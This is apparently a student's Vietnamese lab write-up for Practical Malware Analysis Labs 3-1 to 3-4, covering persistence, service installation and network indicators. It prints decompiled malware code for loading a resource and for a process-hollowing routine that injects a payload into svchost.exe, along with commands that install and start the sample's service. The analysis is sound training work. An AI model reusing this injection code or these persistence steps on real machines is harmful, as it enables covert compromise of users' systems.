# **Lab 3-1**

# 1.

File bị packed, và có lẽ các DLL và API cũng được load thủ công (không thông qua cụm API `LoadLibrary` + `GetProcAddress`) nên dù có thử debug động bằng xdbg, ta vẫn không thể thấy được API trong bảng symbol. E chỉ có thể xem được bảng strings. 

# 2.

![](../../../image/Pasted%20image%2020261005084824.png)

E thấy 4 chuỗi đường dẫn registry, và 1 chuỗi tên file `vmx32to64.exe`. Ngoài ra còn có chuỗi `WinMX32` (tra AI thì nó bảo chuỗi này thường gắn với tên của 1 mutex object, malware có thể dùng mutex để đảm bảo chỉ duy nhất 1 tiến trình chạy tại 1 thời điểm).

![](../../../image/Pasted%20image%2020261005092748.png)

Check sự kiện bằng procmon, e thấy nó tạo 1 file mới tên là `vmx32to64.exe`, ghi dữ liệu vào đó. Rồi thực hiện persistence bằng cách thêm value vào key`RUN\VideoDriver`.
```
HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\VideoDriver: 43 00 3A 00 5C 00 57 00 49 00 4E 00 44 00 4F 00 57 00 53 00 5C 00 73 00 79 00 73 00 74 00 65 00 6D 00 33 00 32 00 5C 00 76 00 6D 00 78 00 33 00 32 00 74 00 6F 00 36 00 34 00 2E 00 65 00 78 00 65
```
Đây là value được thêm vào. Dịch ra thì nó là 
```
C:\WINDOWS\system32\vmx32to64.exe
```
# 3.

![](../../../image/Pasted%20image%2020261005094703.png)

Malware thực hiện truy vấn dns để tìm ip của `www.practicalmalwareanalysis.com`

![](../../../image/Pasted%20image%2020261005094747.png)

Sau đó, nó cũng cố gắng gửi các gói tin yêu cầu kết nối, nhưng máy ảo không thiết lập mạng ảo để trả lời nên không kết nối được.

# **Lab 3-2**

## 1.

Dùng DiE để xem bảng export

![](../../../image/Pasted%20image%2020261004195152.png)

E thấy có 2 hàm là `install` và `installA` dùng để cài đặt. Ngoài ra còn có `ServiceMain`, vậy đây là 1 Service DLL. 

Để nó tự cài đặt, e thử chạy hàm `installA` bằng `rundll32.exe`
```
rundll32.exe "C:\Documents and Settings\luong\Desktop\Practical Malware Analysis Labs\BinaryCollection\Chapter_3L\Lab03-02.dll",installA
```
## 2. 

Để chạy service, e cần dùng lệnh:
```
net start <service_name>
```
Vậy thì cần phải biết tên dịch vụ sau khi nó đăng kí là gì. Theo như e tra AI, thì việc đăng kí service là do `services.exe` làm. Nó sẽ thêm vào 1 subkey có tên là tên service vào đường dẫn registry:
```
HKLM\SYSTEM\CurrentControlSet\Services\<service_name>
```
Rồi thêm vào các value để cấu hình service. 

Vậy thì e nghĩ đến dùng regshot để so sánh trước và sau khi đăng kí, hoặc dùng procmon để record event (nhưng mà record event khó, vì e k hiểu toàn bộ quá trình từ lúc chạy `rundll32.exe` đến khi nó đăng kí xong gồm những bước nào).
```
Keys added: 16
----------------------------------
HKLM\SYSTEM\ControlSet001\Control\Print\Printers
HKLM\SYSTEM\ControlSet001\Control\Print\Printers\Microsoft XPS Document Writer
HKLM\SYSTEM\ControlSet001\Control\Print\Printers\Microsoft XPS Document Writer\DsDriver
HKLM\SYSTEM\ControlSet001\Control\Print\Printers\Microsoft XPS Document Writer\DsSpooler
HKLM\SYSTEM\ControlSet001\Control\Print\Printers\Microsoft XPS Document Writer\PrinterDriverData
HKLM\SYSTEM\ControlSet001\Services\IPRIP
HKLM\SYSTEM\ControlSet001\Services\IPRIP\Parameters
HKLM\SYSTEM\ControlSet001\Services\IPRIP\Security
HKLM\SYSTEM\CurrentControlSet\Control\Print\Printers
HKLM\SYSTEM\CurrentControlSet\Control\Print\Printers\Microsoft XPS Document Writer
HKLM\SYSTEM\CurrentControlSet\Control\Print\Printers\Microsoft XPS Document Writer\DsDriver
HKLM\SYSTEM\CurrentControlSet\Control\Print\Printers\Microsoft XPS Document Writer\DsSpooler
HKLM\SYSTEM\CurrentControlSet\Control\Print\Printers\Microsoft XPS Document Writer\PrinterDriverData
HKLM\SYSTEM\CurrentControlSet\Services\IPRIP
HKLM\SYSTEM\CurrentControlSet\Services\IPRIP\Parameters
HKLM\SYSTEM\CurrentControlSet\Services\IPRIP\Security
```
Ta thấy nó chỉ thêm đúng 1 subkey vào đường dẫn, vậy thì service name sẽ là `IPRIP`.

Vậy thì lệnh chạy service sẽ là:
```
net start IPRIP
```

## 3.

Sau khi khởi chạy, dịch vụ sẽ chạy bên dưới 1 tiến trình chủ là `svchost.exe`. Để tìm được đâu là tiến trình đang chứa dịch vụ đó, ta dùng chức năng find DLL của procexp

![](../../../image/Pasted%20image%2020261004232255.png)

## 4.

Chúng ta có thông tin định danh chính xác tiến trình chủ rồi, nên bộ lọc có thể gồm thông tin về PID.

## 5.

![640](../../../image/Pasted%20image%2020261005095941.png)

- Các Registry key của service.
- Tiến trình `svchost.exe` chứa service.
- File DLL `Lab03-02.dll`

## 6.

![](../../../image/Pasted%20image%2020261005100209.png)

Malware thực hiện truy vấn dns để tìm IP của `practicalmalwareanalysis.com`

![](../../../image/Pasted%20image%2020261005125806.png)

Sau đó, nó thực hiện bắt tay 3 bước, rồi gửi gói http GET để yêu cầu tài nguyên `/serve.html`.

# **Lab 3-3**

## 1.

Nó chạy và tắt ngay lập tức.

## 2.

E nghĩ câu này phân tích tĩnh sẽ tốt hơn.
```c
_BYTE *__cdecl sub_40132C(HMODULE hModule)
{
  HGLOBAL hResData; // [esp+0h] [ebp-14h]
  HRSRC hResInfo; // [esp+4h] [ebp-10h]
  DWORD dwSize; // [esp+8h] [ebp-Ch]
  _BYTE *v5; // [esp+Ch] [ebp-8h]
  void *Src; // [esp+10h] [ebp-4h]

  v5 = nullptr;
  if ( hModule == nullptr )
    return nullptr;
  hResInfo = FindResourceA(hModule, lpName: Name, lpType: Type);
  if ( hResInfo == nullptr )
    return nullptr;
  hResData = LoadResource(hModule, hResInfo);
  if ( hResData != nullptr )
  {
    Src = LockResource(hResData);
    if ( Src != nullptr )
    {
      dwSize = SizeofResource(hModule, hResInfo);
      if ( dwSize != 0 )
      {
        v5 = VirtualAlloc(lpAddress: nullptr, dwSize, flAllocationType: 0x1000u, flProtect: 4u);
        if ( v5 != nullptr )
        {
          memcpy(a1: v5, Src, Size: dwSize);
          if ( *v5 != 77 || v5[1] != 90 )
            sub_401000(a1: v5, a2: dwSize, a3: 65);
        }
      }
    }
  }
  FreeResource(hResData: hResInfo);
  return v5;
}
```
Nhìn vào là thấy ngay cụm API dùng để load resource vào bộ nhớ, ngoài ra hàm `sub_401000` trông như 1 hàm giải mã. chắc chắn là nó dùng để giải mã resource. 

Sau khi xong hàm đấy, nó chạy tiếp hàm `sub_4010EA`
```c
int __cdecl sub_4010EA(LPCSTR lpApplicationName, char *lpBuffer)
{
  HMODULE ModuleHandleA; // eax
  char *v4; // [esp+0h] [ebp-74h]
  int i; // [esp+4h] [ebp-70h]
  int Buffer; // [esp+8h] [ebp-6Ch] BYREF
  LPVOID lpBaseAddress; // [esp+Ch] [ebp-68h]
  FARPROC NtUnmapViewOfSection; // [esp+10h] [ebp-64h]
  LPCONTEXT lpContext; // [esp+14h] [ebp-60h]
  struct _STARTUPINFOA StartupInfo; // [esp+18h] [ebp-5Ch] BYREF
  struct _PROCESS_INFORMATION ProcessInformation; // [esp+5Ch] [ebp-18h] BYREF
  char *v12; // [esp+6Ch] [ebp-8h]
  char *v13; // [esp+70h] [ebp-4h]

  v13 = lpBuffer;
  if ( *(_WORD *)lpBuffer != 23117 )
    return 0;
  v12 = &lpBuffer[*((_DWORD *)v13 + 15)];
  if ( *(_DWORD *)v12 != 17744 )
    return 0;
  memset(a1: &StartupInfo, Val: 0, Size: sizeof(StartupInfo));
  memset(a1: &ProcessInformation, Val: 0, Size: sizeof(ProcessInformation));
  if ( !CreateProcessA(
          lpApplicationName,
          lpCommandLine: nullptr,
          lpProcessAttributes: nullptr,
          lpThreadAttributes: nullptr,
          bInheritHandles: false,
          dwCreationFlags: 4u,
          lpEnvironment: nullptr,
          lpCurrentDirectory: nullptr,
          lpStartupInfo: &StartupInfo,
          lpProcessInformation: &ProcessInformation) )
    return 0;
  lpContext = (LPCONTEXT)VirtualAlloc(lpAddress: nullptr, dwSize: 0x2CCu, flAllocationType: 0x1000u, flProtect: 4u);
  lpContext->ContextFlags = 65543;
  if ( !GetThreadContext(hThread: ProcessInformation.hThread, lpContext) )
    return 0;
  Buffer = 0;
  lpBaseAddress = nullptr;
  NtUnmapViewOfSection = nullptr;
  ReadProcessMemory(
    hProcess: ProcessInformation.hProcess,
    lpBaseAddress: (LPCVOID)(lpContext->Ebx + 8),
    lpBuffer: &Buffer,
    nSize: 4u,
    lpNumberOfBytesRead: nullptr);
  ModuleHandleA = GetModuleHandleA(lpModuleName: ModuleName);
  NtUnmapViewOfSection = GetProcAddress(hModule: ModuleHandleA, lpProcName: ProcName);
  if ( NtUnmapViewOfSection == nullptr )
    return 0;
  ((void (__stdcall *)(HANDLE, int))NtUnmapViewOfSection)(a1: ProcessInformation.hProcess, a2: Buffer);
  lpBaseAddress = VirtualAllocEx(
                    hProcess: ProcessInformation.hProcess,
                    lpAddress: *((LPVOID *)v12 + 13),
                    dwSize: *((_DWORD *)v12 + 20),
                    flAllocationType: 0x3000u,
                    flProtect: 0x40u);
  if ( lpBaseAddress == nullptr )
    return 0;
  WriteProcessMemory(
    hProcess: ProcessInformation.hProcess,
    lpBaseAddress,
    lpBuffer,
    nSize: *((_DWORD *)v12 + 21),
    lpNumberOfBytesWritten: nullptr);
  for ( i = 0; i < *((unsigned __int16 *)v12 + 3); ++i )
  {
    v4 = &lpBuffer[40 * i + 248 + *((_DWORD *)v13 + 15)];
    WriteProcessMemory(
      hProcess: ProcessInformation.hProcess,
      lpBaseAddress: (char *)lpBaseAddress + *((_DWORD *)v4 + 3),
      lpBuffer: &lpBuffer[*((_DWORD *)v4 + 5)],
      nSize: *((_DWORD *)v4 + 4),
      lpNumberOfBytesWritten: nullptr);
  }
  WriteProcessMemory(
    hProcess: ProcessInformation.hProcess,
    lpBaseAddress: (LPVOID)(lpContext->Ebx + 8),
    lpBuffer: v12 + 52,
    nSize: 4u,
    lpNumberOfBytesWritten: nullptr);
  lpContext->Eax = (DWORD)lpBaseAddress + *((_DWORD *)v12 + 10);
  SetThreadContext(hThread: ProcessInformation.hThread, lpContext);
  ResumeThread(hThread: ProcessInformation.hThread);
  return 1;
}
```
Đọc sơ qua đoạn đầu thì thấy nó tạo 1 tiến trình mới rồi lấy chính cái vùng nhớ vừa giải mã tiêm vào chính tiến trình đó. Còn tên tiến trình thì ta đọc hàm `sub_40149D`
```c
char *__cdecl sub_40149D(char *Source, LPSTR lpBuffer, UINT uSize)
{
  size_t v3; // eax
  size_t v5; // [esp-4h] [ebp-4h]

  GetSystemDirectoryA(lpBuffer, uSize);
  v5 = uSize - strlen(Str: lpBuffer);
  v3 = strlen(Str: lpBuffer);
  return strncat(Destination: &lpBuffer[v3], Source, Count: v5);
}
```
Nó lấy đưòng dẫn của hệ thống, rồi ghép vào chuỗi `svchost.exe`.Vậy thì tiến trình được tạo ra có tên là `svchost.exe`.

Vậy thì sự sửa đổi bộ nhớ ở đây chính là việc tiến trình `svchost.exe` bị ghi đè.

## 3.

![](../../../image/Pasted%20image%2020261005003155.png)

`svchost.exe` là tiến trình con của `services.exe`, vậy nên thằng `svchost.exe` pid 296 là tiến trình chứa mã độc.

- Indicator đầu tiên chắc chắn sẽ là tiến trình `svchost.exe` này.

![](../../../image/Pasted%20image%2020261005005804.png)

- Nhìn vào hình, ta có thể đoán được malware có hành vi keylogging. Vậy thì khả năng `practicalmalwareanalysis.log` sẽ là file log lưu lại event phím. Đây cũng là 1 indicator.

## 4.

Dropper, Keylogger.

# **Lab 3-4**

## 1.

Khi chạy, nó tự xóa file thực thi rồi tắt ngay lập tức. Dùng regshot, thấy nó cũng không chỉnh sửa gì.

# 2. 

Nó xóa dấu vết làm cản trở việc phân tích.

# 3.

E k biết :(


